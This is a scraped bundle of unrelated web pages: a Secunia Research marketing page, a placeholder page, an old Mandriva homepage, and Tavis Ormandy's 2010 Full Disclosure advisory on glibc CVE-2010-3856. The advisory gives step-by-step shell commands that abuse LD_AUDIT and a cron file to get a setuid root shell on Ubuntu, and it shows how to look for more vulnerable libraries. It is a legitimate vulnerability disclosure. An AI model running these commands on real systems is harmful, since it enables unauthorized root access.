=== Content from secunia.com_90f19fa1_20250125_231139.html ===


[Skip to main content](#main-content)
[![Home](/themes/custom/flexera/images/logo.svg)](https://www.flexera.com/)

[![Home](/themes/custom/flexera/images/logo.svg)](https://www.flexera.com/)

Search

## Main navigation

* Solutions
  + Column 1
    - Business challenge
      * [Software renewals and audits](https://www.flexera.com/solutions/software-renewals-audits)
      * [Software license management and optimization](https://www.flexera.com/solutions/software-usage-costs)
      * [SaaS spend management](https://www.flexera.com/solutions/saas-spend)
      * [Cloud cost management](https://www.flexera.com/solutions/cloud-cost)
      * [IT asset lifecycle management](https://www.flexera.com/solutions/it-asset-lifecycle)
      * [CMDB data quality](https://www.flexera.com/solutions/cmdb-data-quality)
      * [Accurate IT inventory](https://www.flexera.com/solutions/it-inventory)
      * [Security and regulatory risk management](https://www.flexera.com/solutions/it-security-regulatory-risk)
      * [Sustainable IT](https://www.flexera.com/solutions/sustainable-it)
      * [AI-powered transformation](https://www.flexera.com/solutions/ai-powered-transformation)
      * [Public sector](https://www.flexera.com/solutions/public-sector)
  + Column 2
    - Spend management by vendor
      * [IBM](https://www.flexera.com/solutions/vendor/ibm)
      * [Oracle](https://www.flexera.com/solutions/vendor/oracle)
      * [Microsoft](https://www.flexera.com/solutions/vendor/microsoft)
      * [SAP](https://www.flexera.com/solutions/vendor/sap)
      * [VMware](https://www.flexera.com/solutions/vendor/vmware)
      * [ServiceNow](https://www.flexera.com/solutions/vendor/servicenow)
      * [AWS](https://www.flexera.com/solutions/vendor/aws)
      * [Salesforce](https://www.flexera.com/solutions/vendor/salesforce)
      * [BMC](https://www.flexera.com/solutions/cmdb-data-quality/bmc)
      * [Adobe](https://www.flexera.com/solutions/vendor/adobe)

  ### Achieve more through a united FinOps and ITAM function

  The future is hybrid. Break down the walls between ITAM and FinOps to drive more revenue, more customer growth and more innovation.

  [Discover More](https://www.flexera.com/resources/hybrid-itam-finops)
* Products
  + Column 1
    - [Flexera One](https://www.flexera.com/products/flexera-one)
      * [IT Visibility](https://www.flexera.com/products/flexera-one/it-visibility)
      * [ITAM](https://www.flexera.com/products/flexera-one/it-asset-management)
      * [SaaS Management](https://www.flexera.com/products/flexera-one/saas-management)
      * [FinOps](https://www.flexera.com/products/flexera-one/finops)
      * [Technology Intelligence Platform](https://www.flexera.com/products/flexera-one/technology-intelligence-platform)
  + Column 2
    - [Snow Atlas](https://www.flexera.com/products/snow-atlas)
      * [Snow Spend Optimizer](https://www.flexera.com/products/snow-atlas/snow-spend-optimizer)
      * [Snow SaaS Management](https://www.flexera.com/products/snow-atlas/snow-saas-management)
  + Column 3
    - Hide group
      * [Security](https://www.flexera.com/products/security)
      * [Application Readiness](https://www.flexera.com/products/adminstudio)
      * [All products](https://www.flexera.com/products)
      * [All Snow products](https://www.flexera.com/products/snow)
      * [Integrations](https://www.flexera.com/products/integrations)

  ### Flexera 2024 State of the Cloud Report

  What do transformative initiatives such as GenAI, machine learning and sustainability mean for the cloud? Check out the 2024 State of the Cloud Report to find the answer as well as all the latest cloud computing trends.

  [View Report](https://info.flexera.com/CM-REPORT-State-of-the-Cloud)
* Success
  + Column 1
    - [Customer success](https://www.flexera.com/customer-success)
      * Support
        + [Flexera support portal](https://community.flexera.com/s/support-hub)
        + [Flexera product documentation](https://docs.flexera.com)
        + [Snow product documentation](https://docs.snowsoftware.io/)
      * Services and training
        + [Services](https://www.flexera.com/customer-success/services)
        + [Training](https://www.flexera.com/customer-success/training)
  + Column 2
    - Hide group
      * [Technology Intelligence Awards](https://www.flexera.com/customer-success/awards)
      * [Flexera community](https://community.flexera.com/s/)

  ### Insights from Gartner®

  Find a curated series of actionable and objective insights for IT executives and their teams. Get expert insights from valued analysts, courtesy of Flexera.

  [Discover More](https://www.flexera.com/resources/gartner-analyst-research)
* Resources
  + Column 1
    - [Resources](https://www.flexera.com/resources)
      * [Webinars](https://www.flexera.com/resources?type%5Bwebinar%5D=webinar)
      * [Videos](https://www.flexera.com/resources?type%5Bvideo%5D=video)
      * [Datasheets](https://www.flexera.com/resources?type%5Bdatasheet%5D=datasheet)
      * [White papers & reports](https://www.flexera.com/resources?type%5Bwhite-paper-industry-report%5D=white-paper-industry-report)
  + Column 2
    - Hide group
      * [Blog](/blog/)
      * [Case studies](https://www.flexera.com/resources/case-studies)
      * [Events](https://www.flexera.com/resources?type%5Bevent%5D=event)
      * [Analyst Research](https://www.flexera.com/resources/gartner-analyst-research)
      * [Glossary](https://www.flexera.com/resources/glossary)
      * [Demos & trials](https://www.flexera.com/resources?type%5Bdemo-trials%5D=demo-trials)
      * [Business value calculator](https://www.flexera.com/resources/business-value-calculator)

  ### Flexera 2025 IT Priorities Report

  Insights from Flexera’s 2025 IT Priorities Report highlight what’s top of mind for IT decision makers in the year ahead. Discover the challenges, priorities and opportunities that will shape the future IT landscape.

  [View Report](https://info.flexera.com/ITV-REPORT-IT-Priorities)
* About
  + Column 1
    - [Company](https://www.flexera.com/about-us)
      * [About](https://www.flexera.com/about-us)
      * [Careers](https://www.flexera.com/about-us/careers)
      * [Contact](https://www.flexera.com/about-us/contact-us)
      * [Leadership](https://www.flexera.com/about-us/leadership)
    - [Partners](https://www.flexera.com/about-us/partners)
      * [Partner program](https://www.flexera.com/about-us/partners/partner-program)
      * [Partner directory](https://www.flexera.com/about-us/partners/directory)
  + Column 2
    - [Press center](https://www.flexera.com/about-us/press-center)
      * [Press releases](https://www.flexera.com/about-us/all-press-releases)
      * [Awards](https://www.flexera.com/about-us/press-center#awards)
      * [Articles](https://www.flexera.com/about-us/all-articles)
    - Hide group
      * Social responsibility
        + [ESG](https://www.flexera.com/about-us/environmental-social-governance)
        + [Diversity](https://www.flexera.com/about-us/diversity)

  ### More value with technology intelligence

  The unparalleled synergy of Flexera and Snow provides the Technology Intelligence you need for more efficiency, insight and governance than ever before.

  [Discover More](https://www.flexera.com/more-value-with-technology-intelligence)

Search

en

* [English](https://www.flexera.com/products/security/software-vulnerability-research/secunia-research?referrer=secunia)
* [Deutsch](https://www.flexera.de/products/security/software-vulnerability-research/secunia-research?referrer=secunia)

## External Links

* External Links
  + [Community](https://community.flexera.com/)
  + [Product Access](https://app.flexera.com/login)
  + [Partner Portal](https://flexera.channeltivity.com/Login)

[Book a demo](/about-us/contact-us?C_Interest1=sales)

# Secunia Research

## The world’s best vulnerability intelligence

The Secunia Research team from Flexera provides the most accurate and reliable source of vulnerability intelligence.

[Contact Us](https://www.flexera.com/about-us/contact-us?C_Interest1=sales&C_SolutionInterest=SVM)
Watch video (0:29)

Related links

* [Anatomy of a security advisory](https://www.flexera.com/resources/infographics/anatomy-of-a-security-advisory)
* [Software Vulnerability Research](https://www.flexera.com/products/software-vulnerability-research)
* [Software Vulnerability Manager](/products/software-vulnerability-manager)
* [Security advisories from Secunia Research](https://www.flexera.com/products/security/software-vulnerability-advisories)
* [Report a vulnerability](https://www.flexera.com/about-us/contact-us/report-vulnerability)

 ![Secunia Research](/sites/default/files/2022-04/hero-secunia-research-bg.jpg)

Featured Details

## Multiple ways to consume Secunia Research

Secunia delivers software security research that provides reliable, curated and actionable vulnerability intelligence. Organizations can expect to receive standardized, validated and enriched vulnerability research on a specific version of a software product. Secunia Research supports four solutions:

![Software Vulnerability Research](/sites/default/files/2022-04/icon-secunia-research-svr.svg)

### [Software Vulnerability Research](https://www.flexera.com/products/software-vulnerability-research)

Software Vulnerability Research utilizes Secunia Research to drive awareness of vulnerabilities matching your specified criteria

[Learn More](https://www.flexera.com/products/software-vulnerability-research)

![Software Vulnerability Manager](/sites/default/files/2022-04/icon-secunia-research-svm.svg)

### [Software Vulnerability Manager](/products/software-vulnerability-manager)

Software Vulnerability Manager uses Secunia Research data to identify, prioritize and patch known vulnerable software detected in your environment

[Learn More](/products/software-vulnerability-manager)

![Data Platform](/sites/default/files/2022-04/icon-secunia-research-dp.svg)

### [Data Platform](https://www.flexera.com/products/data-platform)

Data Platform leverages Secunia Research to provide high-level insights based on major or minor versions of software in your normalized inventory

[Learn More](https://www.flexera.com/products/data-platform)

![Flexera One](/sites/default/files/2022-04/icon-secunia-research-flexera-one.svg)

### [Flexera One](/flexera-one)

Flexera One utilizes Secunia Research (alongside public NVD data) to provide more granular matching of build-level versions of software in your normalized inventory within its IT Asset Management and IT Visibility solutions

[Learn More](/flexera-one)

How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

Informing IT, Transforming IT

## Industry insights to help keep you informed

[#### Webinar

### Stay Ahead of Cyber Threats: Flexera's Latest Vulnerability Insights

Join us for this session where we'll explore the latest findings from the Flexera Monthly Vulnerability Insights Report.](https://info.flexera.com/SVM-WBNR-Vulnerability-Insights-Roundtable)

[#### Webinar

### Dive deeper into the Flexera Annual Vulnerability Insights

We'll explore the key findings from the Flexera Annual Vulnerability Insights Report. Learn about the latest cybersecurity trends, the most targeted industries, the types of vulnerabilities, plus management and mitigation strategies.](https://info.flexera.com/SVM-WBNR-Flexera-Annual-Vulnerability-Insights?lead_source=Website%20Visitor&id=Flexera.com-Resources)

#### Video

### Close the Risk Window with Software Vulnerability Manager

Stop reacting. Gain control. Stay secure. Build a more effective risk mitigation process leveraging Secunia Research vulnerability intelligence and the largest repository of third-party patch data in the industry.

Remote video URL

[#### Trial

### Software Vulnerability Manager Assessment free trial

Get access to the complete set of modules of Software Vulnerability Manager: Research, Assessment and Patching](https://info.flexera.com/SVM-EVAL-Software-Vulnerability-Manager)

[#### Datasheet

### Protect your ServiceNow® investment with the highest quality data

IT Visibility offers certified ServiceNow integrations that accelerate platform expansion, improve ROI and increase efficiencies across ITIL processes by delivering clean software and hardware asset data directly.](/sites/default/files/datasheet-itv-maximize-servicenow-investment.pdf)

[#### Blog

### Avoid missing crucial vulnerability intelligence amid NVD backlog

Recent developments regarding the National Vulnerability Database (NVD) have some technology leaders on edge. Since February, the U.S. National Institute of Standards and Technology (NIST) has almost completely stopped enriching software vulnerabi...](https://www.flexera.com/blog/vulnerability-management/avoid-missing-crucial-vulnerability-intelligence-amid-nvd-backlog/)

[View all resources](https://www.flexera.com/resources?category%5Bsoftware-vulnerability-management%5D=software-vulnerability-management)

## Footer Menu

* Column
  + Business challenge
    - [Software renewals and audits](https://www.flexera.com/solutions/software-renewals-audits)
    - [Software license management and optimization](https://www.flexera.com/solutions/software-usage-costs)
    - [SaaS spend management](https://www.flexera.com/solutions/saas-spend)
    - [Cloud cost management](https://www.flexera.com/solutions/cloud-cost)
    - [IT asset lifecycle management](https://www.flexera.com/solutions/it-asset-lifecycle)
    - [CMDB data quality](https://www.flexera.com/solutions/cmdb-data-quality)
    - [Accurate IT inventory](https://www.flexera.com/solutions/it-inventory)
    - [Security and regulatory risk management](https://www.flexera.com/solutions/it-security-regulatory-risk)
    - [Sustainable IT](https://www.flexera.com/solutions/sustainable-it)
    - [AI-powered transformation](https://www.flexera.com/solutions/ai-powered-transformation)
    - [Public sector](https://www.flexera.com/solutions/public-sector)
* Column
  + Spend management by vendor
    - [IBM](https://www.flexera.com/solutions/vendor/ibm)
    - [Oracle](https://www.flexera.com/solutions/vendor/oracle)
    - [Microsoft](https://www.flexera.com/solutions/vendor/microsoft)
    - [SAP](https://www.flexera.com/solutions/vendor/sap)
    - [VMware](https://www.flexera.com/solutions/vendor/vmware)
    - [ServiceNow](https://www.flexera.com/solutions/vendor/servicenow)
    - [AWS](https://www.flexera.com/solutions/vendor/aws)
    - [Salesforce](https://www.flexera.com/solutions/vendor/salesforce)
    - [BMC](https://www.flexera.com/solutions/cmdb-data-quality/bmc)
    - [Adobe](https://www.flexera.com/solutions/vendor/adobe)
* Column
  + Products
    - [Flexera One](https://www.flexera.com/products/flexera-one)
    - [Snow Atlas](https://www.flexera.com/products/snow-atlas)
    - [Security](https://www.flexera.com/products/security)
    - [Application Readiness](https://www.flexera.com/products/adminstudio)
    - [All products](https://www.flexera.com/products)
    - [All Snow products](https://www.flexera.com/products/snow)
    - [Integrations](https://www.flexera.com/products/integrations)
* Column
  + Company
    - [About](https://www.flexera.com/about-us)
    - [Careers](https://www.flexera.com/about-us/careers)
    - [Leadership](https://www.flexera.com/about-us/leadership)
    - [Contact us](https://www.flexera.com/about-us/contact-us)
    - [Media / press center](https://www.flexera.com/about-us/press-center)
    - [Revenera.com](https://www.revenera.com)

 +1.800.374.4353

en

* [English](https://www.flexera.com/products/security/software-vulnerability-research/secunia-research?referrer=secunia)
* [Deutsch](https://www.flexera.de/products/security/software-vulnerability-research/secunia-research?referrer=secunia)

 [![Home](/themes/custom/flexera/images/logo.svg)](https://www.flexera.com/)

© 2025 Flexera. All Rights Reserved.

## Footer

* [Privacy Policy](https://www.flexera.com/legal/privacy-policy)
* [Terms and conditions](https://www.flexera.com/legal)
* [Contact Us](https://www.flexera.com/about-us/contact-us)
* [Impressum](https://www.flexera.com/about-us/impressum)
* [Site Map](https://www.flexera.com/sitemap)

#####

×

...



=== Content from www.vupen.com_ecbcc421_20250125_231154.html ===

[![](/__ovh/common/img/logo-white.png)](https://www.ovhcloud.com/)

![](/__ovh/common/img/icon-traffic-cone.png)

# Site en construction

![](/__ovh/common/img/shadow.png)

Besoin d'assistance ou d'informations ?

[![](/__ovh/common/img/icon-book.png)
Guides](https://docs.ovh.com/fr/hosting/ "Guides")
[![](/__ovh/common/img/icon-speech-bubble.png)
Forum](https://community.ovh.com/ "Forum")
[![](/__ovh/common/img/icon-user-support.png)
Contact](https://help.ovhcloud.com/fr/ "Contact")
[![](/__ovh/common/img/icon-app-gear.png)
Espace Client](https://www.ovh.com/manager/ "Espace Client")

© Copyright 1999 [OVHcloud](https://www.ovhcloud.com/)

v1v2v3v4v5v6v7v8v9v10v11v12v13v14v15v16v17v18v19v20v21v22v23v24v25v26v27v28v29v30v31v32v33v34v35v36v37v38v39v40v41v42v43v44v45v46v47v48v49v50v51v52v53v54v55v56v57v58v59v60v61v62v63v64v65v66v67v68v69v70

u1u2u3u4u5u6u7u8u9u10u11u12u13u14u15u16u17u18u19u20u21u22u23u24u25u26u27u28u29u30u31u32u33u34u35u36u37u38u39u40u41u42u43u44u45u46u47u48u49u50u51u52u53u54u55u56u57u58u59u60u61u62u63u64u65u66u67u68u69

p1p2p3p4p5p6p7p8p9p10p11p12p13p14p15p16p17p18p19p20p21p22p23p24p25p26p27p28p29p30p31p32p33p34p35p36p37p38p39p40p41p42p43p44p45p46p47p48p49p50p51p52p53p54p55p56p57p58p59p60p61p62p63p64

e1e2e3e4e5e6e7e8e9e10e11e12e13e14e15e16e17e18e19e20e21e22e23e24e25e26e27e28e29e30e31e32e33e34e35e36e37e38e39e40e41e42e43e44e45e46e47e48e49e50e51e52e53

n1n2n3n4n5n6n7n8n9n10n11n12n13n14n15n16n17n18n19n20n21n22n23n24n25n26n27n28n29n30n31n32n33n34n35n36n37n38n39n40n41n42n43n44n45n46n47n48n49n50n51n52n53n54n55n56n57n58n59n60n61n62

---

c1c2c3c4c5c6c7c8c9c10c11c12c13c14c15c16c17c18c19c20c21c22c23c24c25c26c27c28c29c30c31c32c33c34c35c36c37c38c39c40c41c42c43c44c45c46c47c48c49c50c51

o1o2o3o4o5o6o7o8o9o10o11o12o13o14o15o16o17o18o19o20o21o22o23o24o25o26o27o28o29o30o31o32o33o34o35o36o37o38o39o40o41o42o43o44o45o46o47o48o49o50o51o52o53o54o55o56o57o58o59o60o61o62o63

m1m2m3m4m5m6m7m8m9m10m11m12m13m14m15m16m17m18m19m20m21m22m23m24m25m26m27m28m29m30m31m32m33m34m35m36m37m38m39m40m41m42m43m44m45m46m47m48m49m50m51m52m53m54m55m56m57m58m59m60m61



=== Content from seclists.org_ff48d6e4_20250126_124126.html ===

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)
[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)
## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](343)
[By Date](date.html#344)
[![Next](/images/right-icon-16x16.png)](345)

[![Previous](/images/left-icon-16x16.png)](343)
[By Thread](index.html#344)
[![Next](/images/right-icon-16x16.png)](345)

![](/shared/images/nst-icons.svg#search)

# The GNU C library dynamic linker will dlopen arbitrary DSOs during setuid loads.

---

*From*: Tavis Ormandy <taviso () cmpxchg8b com>

*Date*: Fri, 22 Oct 2010 19:00:34 +0200

---

```
The GNU C library dynamic linker will dlopen arbitrary DSOs during setuid loads
-------------------------------------------------------------------------------

Cześć, This advisory describes CVE-2010-3856, an addendum to CVE-2010-3847.

Please see <http://seclists.org/fulldisclosure/2010/Oct/257> for background
information.

For obvious reasons, the dynamic linker will ignore requests to preload user
specified libraries for setuid/setgid programs. However, it is possible to
imagine legitimate use cases for this functionality, so the glibc developers
provide an exception to this rule.

 LD_PRELOAD
     A whitespace-separated list of additional, user-specified, ELF
     shared libraries to be loaded before all others. This can be
     used to selectively override functions in other shared
     libraries. For set-user-ID/set-group-ID ELF binaries, only
     libraries in the standard search directories that are also set-
     user-ID will be loaded.

In order to be preloaded during the execution of a privileged program, a
library must be setuid and in the trusted library search path. This is a
reasonable design, before a library will be loaded, the system administrator
must brand a library as safe to load across privilege boundaries.

This feature allows developers who design their programs to operate safely
while running as setuid to opt-in to doing so. Bizarrely, the same conditions
do not apply to LD_AUDIT, which will load an arbitrary DSO, regardless of
whether it has been designed to operate safely or not.

While the dynamic loader will only use a library that exports the dynamic
symbols required by the rtld-auditing API, it must first dlopen() the
library in order to examine the exported symbols. By definition, this must
execute any defined initialization routines.

This confusion can be exploited by locating a DSO in the trusted search path with
initialization code that has not been designed to operate safely while euid !=
uid. See the Notes section below for additional discussion on this topic.

--------------------
Affected Software
------------------------

At least the following versions have been tested

    2.12.1, FC13
    2.5, RHEL5 / CentOS5
    2.11.1, Ubuntu 10

--------------------
Consequences
-----------------------

This is a low impact issue that is only of interest to security
professionals and system administrators, end users do not need to be
concerned.

It is possible to exploit this confusion to execute arbitrary code as root.

The exact steps required to exploit this vulnerability will vary from
distribution to distribution, but an example from Ubuntu 10.04 is given below.

# The creation mask is inherited by children, and survives even a setuid
# execve. Therefore, we can influence how files are created during
# exploitation.
$ umask 0

# libpcprofile is distributed with the libc package.
$ dpkg -S /lib/libpcprofile.so
libc6: /lib/libpcprofile.so
$ ls -l /lib/libpcprofile.so
-rw-r--r-- 1 root root 5496 2010-10-12 03:32 /lib/libpcprofile.so

# We identified one of the pcprofile constructors is unsafe to run with
# elevated privileges, as it creates the file specified in the output
# environment variable.
$ LD_AUDIT="libpcprofile.so" PCPROFILE_OUTPUT="/etc/cron.d/exploit" ping
ERROR: ld.so: object 'libpcprofile.so' cannot be loaded as audit interface: undefined symbol: la_version; ignored.
Usage: ping [-LRUbdfnqrvVaA] [-c count] [-i interval] [-w deadline]
            [-p pattern] [-s packetsize] [-t ttl] [-I interface or address]
            [-M mtu discovery hint] [-S sndbuf]
            [ -T timestamp option ] [ -Q tos ] [hop1 ...] destination

# This results in creating a world writable file in the crontab directory.
$ ls -l /etc/cron.d/exploit
-rw-rw-rw- 1 root taviso 65 2010-10-21 14:22 /etc/cron.d/exploit

# Setup a cronjob to give us privileges (of course, there are dozens of other
# ways this could be exploited).
$ printf "* * * * * root cp /bin/dash /tmp/exploit; chmod u+s /tmp/exploit\n" > /etc/cron.d/exploit

# Wait a few minutes...
$ ls -l /tmp/exploit
ls: cannot access /tmp/exploit: No such file or directory
$ ls -l /tmp/exploit
ls: cannot access /tmp/exploit: No such file or directory
$ ls -l /tmp/exploit
-rwsr-xr-x 1 root root 83888 2010-10-21 14:25 /tmp/exploit

# A setuid root shell appears.
$ /tmp/exploit
# whoami
root

-------------------
Solution
-----------------------

Major distributions should be releasing updated glibc packages shortly.

-------------------
Credit
-----------------------

This bug was discovered by Tavis Ormandy.

Thanks to Ben Hawkes and Julien Tinnes for additional insight, and
their expertise tracking down convincing attack vectors.

-------------------
Greetz
-----------------------

Greetz to Hawkes, Julien, LiquidK, Lcamtuf, Neel, Spoonm, Felix, Robert,
Asirap, Spender, Pipacs, Gynvael, Scarybeasts, Redpig, Kees, Eugene, Bruce D.,
and all my other elite friends and colleagues.

Additional greetz to the openwall guys who saw this problem coming years ago.
They continue to avoid hundreds of security vulnerabilities each year thanks to
their insight into systems security.

<http://www.openwall.com/owl/>

-------------------
Notes
-----------------------

Finding candidate libraries is simple a matter of identifying DSOs that have
declared constructors or other initialization code. There are multiple
locations that initialization code can be declared, but .ctors is a common
example.

Using objdump, you can examine the section headers for any .ctors section.

$ find /lib /usr/lib -maxdepth 1 -type f -exec objdump --headers --section=.ctors {} \;

[ The system administrator can add additional trusted search paths by declaring
  them in /etc/ld.so.conf, but /lib and /usr/lib are the default paths. ]

If a ctors section has a size greater than 2 * wordsize, constructors have been
declared, and should be checked to see if they do anything interesting. An
empty list is 2 * wordsize bytes because it must still hold the two invalid
function pointers inserted into the list to mark list boundaries (alternatively
you could print the difference between the symbols __CTOR_LIST__ and
__CTOR_END__).

<http://gcc.gnu.org/onlinedocs/gcc-2.95.3/gcc_17.html#SEC237>

 "Each list always begins with an ignored function pointer (which may hold 0, -1,
  or a count of the function pointers after it, depending on the environment).
  This is followed by a series of zero or more function pointers to constructors
  (or destructors), followed by a function pointer containing zero."

$ objdump --section=.ctors --headers /usr/lib/liblftp-tasks.so.0

/usr/lib/liblftp-tasks.so.0:     file format elf32-i386

Sections:
Idx Name          Size      VMA       LMA       File off  Algn
 17 .ctors        00000040  00ddafc4  00ddafc4  00071fc4  2**2
                  CONTENTS, ALLOC, LOAD, DATA

Alternatively,

$ gdb -q /usr/lib/liblftp-tasks.so.0
Reading symbols from /usr/lib/liblftp-tasks.so.0...(no debugging symbols found)...done.
(gdb) symbol-file /usr/lib/debug/usr/lib/liblftp-tasks.so.0.debug
(gdb) p &__CTOR_END__ - &__CTOR_LIST__
$1 = 15

This looks like a good candidate with lots of constructors. You can use objdump
or gdb to dump the contents of the list.

$ objdump --full-contents --section=.ctors /usr/lib/liblftp-tasks.so.0

/usr/lib/liblftp-tasks.so.0:     file format elf32-i386

Contents of section .ctors:
 ddafc4 ffffffff 205fd800 e068d800 d07ad800  .... _...h...z..
 ddafd4 608ad800 6067d900 7079d900 b0b3d900  `...`g..py......
 ddafe4 d004da00 a037da00 403bda00 3061da00  .....7..@;..0a..
 ddaff4 9062da00 90aada00 20ebdb00 00000000  .b...... .......

Notice the ffffffff at the start of the list, and 00000000 terminating it. The
other entries are function pointers, stored in native byteorder.

Examining the source code reveals it will mkdir(getenv("LFTP_HOME"), 0755) in
the constructors for the Bookmark and History classes, so we can use this to
create arbitrary directories as root.

 40 Bookmark::Bookmark()
 41 {
 42    const char *home = get_lftp_home();
    ...
 47 }

Followed by:

785 const char *get_lftp_home()
786 {
    ...
792    home = getenv("LFTP_HOME");
    ...
811    mkdir(home, 0755);
812    return home;
813 }

Therefore,

$ LD_AUDIT="liblftp-tasks.so.0" LFTP_HOME=/etc/exploit ping
ERROR: ld.so: object 'liblftp-tasks.so.0' cannot be loaded as audit interface: undefined symbol: la_version; ignored.
Usage: ping [-LRUbdfnqrvVaA] [-c count] [-i interval] [-w deadline]
            [-p pattern] [-s packetsize] [-t ttl] [-I interface or address]
            [-M mtu discovery hint] [-S sndbuf]
            [ -T timestamp option ] [ -Q tos ] [hop1 ...] destination
$ ls -ld /etc/exploit
drwxr-x---. 2 root taviso 4.0K Oct 22 01:18 /etc/exploit/

And so on, repeat for all accessible DSOs. The ELF standards document
initialization and termination here

<http://web.archive.org/web/20041026003725/www.caldera.com/developers/gabi/2003-12-17/ch5.dynamic.html#init_fini>

-------------------
References
-----------------------

- <http://man.cx/ld.so%288%29>, The dynamic linker/loader, Linux Programmer's Manual.
- <http://man.cx/rtld-audit>, The auditing API for the dynamic linker, Linux Programmer's Manual.
- Linkers and Loaders, John R. Levine, ISBN 1-55860-496-0.

You should subscribe to Linux Weekly News and help support their high standard
of security journalism.

<http://lwn.net/>

I have a twitter account where I occasionally comment on security topics.

<http://twitter.com/taviso>

ex$$

--
-------------------------------------
taviso () cmpxchg8b com | pgp encrypted mail preferred
-------------------------------------------------------

_______________________________________________
Full-Disclosure - We believe in it.
Charter: <http://lists.grok.org.uk/full-disclosure-charter.html>
Hosted and sponsored by Secunia - <http://secunia.com/>
```

---

[![Previous](/images/left-icon-16x16.png)](343)
[By Date](date.html#344)
[![Next](/images/right-icon-16x16.png)](345)

[![Previous](/images/left-icon-16x16.png)](343)
[By Thread](index.html#344)
[![Next](/images/right-icon-16x16.png)](345)

### Current thread:

* **The GNU C library dynamic linker will dlopen arbitrary DSOs during setuid loads.** *Tavis Ormandy (Oct 22)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")



=== Content from www.mandriva.com_35e0a949_20250125_231146.html ===


* [Tuxedo.org](https://tuxedo.org/ "Go to: Tuxedo")
* Store
* Mandriva Linux
* Enterprise Solutions
* Contact Us
* Language ![](/sites/all/themes/mandriva_customer/images/arrow-grey-bottom.gif)
  + English (International)
  + Français
  + Ð ÑÑÑÐºÐ¸Ð¹

# [Mandriva](/mandriva/)

* Download
* Mandriva Linux
* Community
* Help

## One

### The Linux desktopthat's easy to try and easy to keep

Download
![Mandriva One](/sites/all/themes/mandriva_customer/images/front/packshot_Mandriva_One.png)

## Powerpack

### Mandriva Linux- and more

Download
![Mandriva Linux Powerpack](/sites/all/themes/mandriva_customer/images/front/en-49.png)

## Mandriva Flash

### The mobile and installable Linux desktopon a USB key

Buy on Store
![Mandriva Flash](/sites/all/themes/mandriva_customer/images/front/mandriva-flash2.png)

### [Community](community)

* User Forums
* Support - FAQ
* Free Software
* Become a member

### Enterprise Solutions

* Enterprise Linux Products
* Asset Management Solution
* Professional Services
* Support & Maintenance

* Go to site »

### Mandriva Partners

* Worldwide offices
* Partner Program
* Technology Partners
* OEM
* Classmate PC with Mandriva Linux

### News

* Mandriva presents the launch of its new mobile desktop: Mandriva Flash 2008 Spring
* Speaking about Mandriva Linux 2008 Spring in media
* Speaking about Mandriva Linux 2008 Spring in media
* Mandriva presents its latest distribution: Mandriva Linux 2008 Spring
* Mandriva and Novatice Technologies present Edutice, The ready to use solution dedicated to educationand multimedia spaces
* # [Top 50 Online Casinos UK in 2023](https://montycasinos.com/online-casinos/)

more

* Download
  + Mandriva Linux 2008
  + Writing an ISO image
* Mandriva Linux
  + One
  + Powerpack
  + Mandriva Flash
* Community
  + Start
  + Register
  + Stay informed
  + Participate
  + Free software
* Help
  + Getting help
  + Knowledge Base
  + Documentation
  + Forums
  + Support Requests
  + Customer Care
  + Enterprise Support
* Enterprise Solutions
  + Products
  + Support
  + Services
  + Partners
  + Go to site »

